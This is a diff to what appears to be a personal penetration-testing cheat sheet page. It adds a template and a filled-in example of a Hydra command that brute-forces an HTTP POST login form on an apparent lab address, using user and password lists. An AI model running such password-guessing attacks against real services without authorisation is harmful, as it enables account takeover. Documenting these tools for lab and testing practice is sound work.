@@ -174,6 +174,15 @@ layout: default
 		<li>Brute force</li>
 		<ul>
 			<li>Hydra</li>
+			<table>
+				<tr>
+					<td>Post form bruteforce</td>
+					<td>
+						<li>hydra -L &lt;usernames list&gt; -P &lt;password list&gt; &lt;ip address&gt; http-post-form &quot;&lt;login web path&gt;:&lt;post request data&gt;:&lt;invalid login web page text&gt;"</li>
+						<li>hydra -L users_email.list -P cewl.out 10.129.71.58 http-post-form &quot;/login:email=^USER^&amp;password=^PASS^:Something went wrong, sorry about that...&quot;</li>
+					</td>
+				</tr>
+			</table>
 			<li>BurpSuite Intruder</li>
 			<li>Wordpress - wpscan (also an overall vulnerability scanner)</li>
 		</ul>
